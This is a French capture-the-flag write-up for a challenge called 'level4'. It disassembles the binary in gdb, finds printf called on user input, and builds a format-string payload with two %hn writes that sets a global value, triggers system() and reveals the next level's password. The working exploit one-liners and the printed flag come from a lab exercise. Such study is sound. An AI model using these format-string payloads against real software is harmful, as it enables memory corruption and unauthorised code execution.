# Level4

On observe un executable a la racine `level4`

```bash
$ ./level4
Hello World
Hello World
```

On cherche donc a comprendre ce que fait l'executable

```bash
$ gdb level4 -q
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) set disassembl
disassemble-next-line  disassembly-flavor
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218
   0x08048460 <+9>:     mov    eax,ds:0x8049804
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:    lea    eax,[ebp-0x208]
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    eax,[ebp-0x208]
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    eax,ds:0x8049810
   0x08048492 <+59>:    cmp    eax,0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

On va utiliser `Cutter` pour avoir un idee plus clair de `level4`

```bash
$ scp -P 4242 -r level4@192.168.56.102:/home/user/level4/level4 .

$ ./Cutter-v2.1.2-Linux-x86_64.AppImage level4
```

_resultat sauvegarde dans [source.md](source.md)_

Meme exercice que le `level3` mais cette fois `m` est compare avec `0x1025544` et printf est dans une function

Dans un premier temps, on essaye d'afficher notre `AAAA` grace au `%x` de printf en modifiant la value `i` dans `%i$x`.

On obtient `i = 12`

```bash
$ python -c 'print "AAAA %12$x"' | ./level4
AAAA 41414141
```

On remplace `AAAA` par l'adresse de `m` et on verifie

```bash
$ python -c 'print "\x10\x98\x04\x08 %12$.8x"' | ./level4
 08049810
```

plus qu'a changer la valeur de `m` grace au `%n` de printf mais `0x1025544` est trop gros pour le faire en une fois.
Nous allons donc ecrire `0x102` sur 2octets et `0x5544` 2 octets plus loin pour former notre nombre final

```bash
$ python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"' | ./level4
...
                                               -1073743996
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

level4:$ su level5
Password:

level5:$
```
